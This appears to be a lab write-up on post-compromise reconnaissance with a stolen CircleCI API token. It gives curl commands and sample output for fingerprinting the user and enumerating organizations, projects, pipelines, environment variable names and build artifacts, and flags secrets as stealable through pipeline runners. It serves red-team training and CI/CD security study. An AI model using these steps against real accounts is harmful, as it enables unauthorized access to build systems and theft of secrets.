## Validate API Token & Fingerprint the User
`curl -X GET https://circleci.com/api/v2/me -s -H "Circle-Token: CCIPA-XXXX"`

```json
{
  "name" : "cicdlab@yopmail.com",
  "login" : "cicdlab@yopmail.com",
  "id" : "79c369ca-21e9-41b7-bcdd-41f58de01a9a",
  "avatar_url" : "https://s.gravatar.com/avatar/294d7f0af9489d3e4bd8ba8ffff6785d?s=480&r=pg&d=https%3A%2F%2Fcdn.auth0.com%2Favatars%2Fci.png"
}
```

From the output, we learn that the token belongs to the user cicdlab@yopmail.com, revealing the associated email, login ID, user UUID, and avatar URL confirming that the token is valid and linked to an active CircleCI account.

## Enumerate Org User Has Access To
`curl -X GET https://circleci.com/api/v2/me/collaborations -s -H "Circle-Token: CCIPA-XXXX"`
Look for:
- slug format is gh/org-name
- List of orgs the user belongs to, these can also the org invited by other users

```json
[ {
  "vcs_type" : "circleci",
  "slug" : "circleci/QKb69uDoR3U2hd9tTuA2Yw",
  "name" : "ASCPC",
  "id" : "bcda95c5-49cc-4399-a4f5-699409399c08",
  "avatar_url" : "https://avatars.githubusercontent.com/u/1231870?v=4"
}, {
  "vcs_type" : "circleci",
  "slug" : "circleci/DrNsW5SW6K42zooKCzkVek",
  "name" : "WhiteKnightLabs",
  "id" : "68129642-b377-4bd1-a534-a94d01d2db25",
  "avatar_url" : "https://avatars.githubusercontent.com/u/1231870?v=4"
} ]
```
From the output of the /me/collaborations API endpoint, we can see that the compromised CircleCI token is associated with two organizations: *ASCPC* and *WhiteKnightLabs*

## Listing All The Projects in Organization
`curl -X GET https://circleci.com/api/private/project?organization-id=[--OrgID--] -s -H "Circle-Token: CCIPA-XXXX"`

```json
{
  "items" : [ {
    "id" : "25b594f1-3d1e-4e94-a0b3-c92fce724c7f",
    "last_build_finished_at" : "2025-07-14T09:56:47.585Z",
    "name" : "WKL LAB",
    "slug" : "circleci/DrNsW5SW6K42zooKCzkVek/5f5V895psFhHnMngjqyia2"
  }, {
    "id" : "d5e87839-c1ac-45d0-a6c1-986f8faeabd5",
    "last_build_finished_at" : "2025-07-14T08:45:07.803Z",
    "name" : "wkl-pro-st1",
    "slug" : "circleci/DrNsW5SW6K42zooKCzkVek/TR2eS1FtBshdqkgqtiiaDa"
  }, {
    "id" : "d1468fea-a9f2-49ef-9f69-661dc701dfe5",
    "last_build_finished_at" : "2025-07-14T08:45:07.641Z",
    "name" : "wkl-stg-g1",
    "slug" : "circleci/DrNsW5SW6K42zooKCzkVek/SqrKaVLkPkKaPAxNDvo1YY"
  } ],
  "next_page_token" : null
}
```

This API request lists:
- Project names
- Project slugs (used in further API calls)
- VCS provider (GitHub/Bitbucket)
- Repo URLs
- Creation & update metadata

## Deep Dive into CircleCI Metadata Enumeration
`https://circleci.com/api/v2/project/circleci/DrNsW5SW6K42zooKCzkVek/TR2eS1FtBshdqkgqtiiaDa`

```json
{
  "slug" : "circleci/DrNsW5SW6K42zooKCzkVek/TR2eS1FtBshdqkgqtiiaDa",
  "organization_name" : "WhiteKnightLabs",
  "organization_id" : "68129642-b377-4bd1-a534-a94d01d2db25",
  "name" : "wkl-pro-st1",
  "id" : "d5e87839-c1ac-45d0-a6c1-986f8faeabd5",
  "organization_slug" : "circleci/DrNsW5SW6K42zooKCzkVek",
  "vcs_info" : {
    "vcs_url" : "//circleci.com/68129642-b377-4bd1-a534-a94d01d2db25/d5e87839-c1ac-45d0-a6c1-986f8faeabd5",
    "default_branch" : "main",
    "provider" : "CircleCI"
  }
}
```

## List All Pipelines for the Organization
`curl -X GET https://circleci.com/api/v2/pipeline?org-slug=[--slug--] -s -H "Circle-Token: CCIPA-XXXX"`

## Enumerate Environment Variables Per Project (High Value)
`curl -X GET https://circleci.com/api/v2/project/[--circle.project/slug--]/envvar -s -H "Circle-Token: CCIPA-XXXX"`
- Here we cannot get the value of the environment variables, it can only be stolen by running the pipelines
- Which Means it can only be stolen from the Runners

## Dumping Artifacts
- Listing Projects
	- `https://circleci.com/api/private/project?organization-id=[--OrgId--]`
- List Pipelines builds for the projects
	- `https://circleci.com/api/v1.1/project/[--Project-Slug-Value--]`
- Loop Through the Build Num to get Artifacts
	- `https://circleci.com/api/v1.1/project/[--Project-Slug-Value--]/[-build_num--]/artifacts`
